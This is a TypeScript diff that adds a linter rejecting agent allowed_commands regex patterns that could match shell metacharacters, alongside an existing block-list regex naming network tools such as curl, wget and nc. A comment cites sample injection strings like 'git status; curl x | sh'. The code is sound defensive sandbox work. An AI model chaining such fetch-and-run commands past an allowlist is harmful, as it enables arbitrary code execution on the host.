@@ -13,6 +13,59 @@ import { validateWorkflow } from "./dag.ts";
 // Network clients that shell patterns must not name unless the definition sets network: true.
 const NETWORK_COMMANDS = /\b(curl|wget|nc|ncat|netcat|ssh|scp|sftp)\b/;
 
+// Shell metacharacters an allowed_commands pattern must never be able to match:
+// any one of these in an approved command allows chaining a second, arbitrary command.
+const SHELL_METACHARACTERS = [";", "|", "&", "$", "`", ">", "<", "\n"];
+
+// Whitelist grammar for allowed_commands patterns. Only shapes we can prove
+// cannot match a metacharacter are accepted: safe literal characters, one level
+// of (a|b) alternation over them, negated classes that exclude every shell
+// metacharacter, and quantifiers. Deliberately no ".", "\s", ranges, or nesting.
+const SAFE_CHAR = "[a-zA-Z0-9 _,:=@/+-]"; // no "." — an unescaped dot is the wildcard
+const ESCAPED_DOT = String.raw`\\\.`;
+const NEGATED_CLASS = String.raw`\[\^[^\]]+\]`;
+const QUANT = String.raw`(?:[*+?]|\{\d+(?:,\d*)?\})?`;
+const ATOM = `(?:${SAFE_CHAR}|${ESCAPED_DOT}|${NEGATED_CLASS})${QUANT}`;
+const SEQ = `(?:${ATOM})*`;
+const GROUP = String.raw`\((?:${SEQ})(?:\|${SEQ})*\)${QUANT}`;
+const SAFE_PATTERN = new RegExp(`^\\^(?:${ATOM}|${GROUP})*\\$$`);
+
+/**
+ * Rejects allowed_commands patterns that could approve a command containing shell
+ * metacharacters. A pattern like "git status.*" matches "git status; curl x | sh"
+ * (`.` matches ";" and "|"), which voids every other sandbox guarantee — and an
+ * unanchored pattern matches as a substring, approving "evil; git status".
+ * Returns a reason string when the pattern is unsafe, null when it passes.
+ */
+export function lintShellPattern(pattern: string): string | null {
+  try {
+    new RegExp(pattern);
+  } catch (e) {
+    return `invalid regex: ${(e as Error).message}`;
+  }
+  if (!pattern.startsWith("^") || !pattern.endsWith("$")) {
+    return "must be anchored with ^ and $ (unanchored patterns match as substrings)";
+  }
+  for (const match of pattern.matchAll(/\[\^([^\]]+)\]/g)) {
+    const body = match[1]!;
+    const missing = SHELL_METACHARACTERS.filter(
+      (m) => !(m === "\n" ? body.includes("\\n") || body.includes("\n") : body.includes(m)),
+    );
+    if (missing.length > 0) {
+      const shown = missing.map((m) => (m === "\n" ? "\\n" : m)).join(" ");
+      return `negated class [^${body}] must also exclude: ${shown}`;
+    }
+  }
+  if (!SAFE_PATTERN.test(pattern)) {
+    return (
+      "contains constructs that could match shell metacharacters; allowed: " +
+      "safe literal characters, (a|b) groups, [^…] classes excluding all metacharacters, " +
+      'and quantifiers — e.g. "^git status[^;&|<>$`\\n]*$"'
+    );
+  }
+  return null;
+}
+
 const agentFrontmatterSchema = z
   .object({
     name: z.string().regex(/^[a-z0-9][a-z0-9-]*$/, "lowercase alphanumeric + hyphens"),
@@ -85,6 +138,14 @@ export function parseAgentMarkdown(text: string, sourceName: string): AgentDefin
     throw new DefinitionError(`${sourceName}: ${parsed.error.issues.map(fmtIssue).join("; ")}`);
   }
   const fm = parsed.data;
+  for (const pattern of fm.allowed_commands) {
+    const problem = lintShellPattern(pattern);
+    if (problem) {
+      throw new DefinitionError(
+        `${sourceName}: unsafe allowed_commands pattern "${pattern}": ${problem}`,
+      );
+    }
+  }
   if (!fm.network) {
     const offender = fm.allowed_commands.find((c) => NETWORK_COMMANDS.test(c));
     if (offender) {
